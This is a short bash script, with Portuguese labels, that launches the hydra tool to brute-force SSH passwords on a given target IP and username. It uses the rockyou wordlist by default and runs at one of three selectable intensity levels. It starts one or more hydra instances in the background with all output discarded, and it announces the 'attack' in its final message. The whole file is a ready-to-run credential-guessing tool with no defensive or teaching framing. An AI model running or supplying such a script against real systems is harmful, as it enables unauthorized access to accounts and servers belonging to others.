#!/usr/bin/env bash
# attack_hydra.sh
# Usage: ./attack_hydra.sh <target_ip> <user> <wordlist> <level>
TARGET=${1:-127.0.0.1}; USER=${2:-root}; WORDLIST=${3:-/usr/share/wordlists/rockyou.txt}; LEVEL=${4:-leve}
case "$LEVEL" in
  leve) THREADS=4; INSTANCES=1;;
  moderado) THREADS=32; INSTANCES=1;;
  pesado) THREADS=128; INSTANCES=2;;
  *) THREADS=16; INSTANCES=1;;
esac
for i in $(seq 1 $INSTANCES); do
  nohup hydra -l "$USER" -P "$WORDLIST" -t "$THREADS" ssh://$TARGET >/dev/null 2>&1 &
  sleep 0.5
done
echo "Ataque iniciado: target=$TARGET user=$USER threads=$THREADS instances=$INSTANCES"
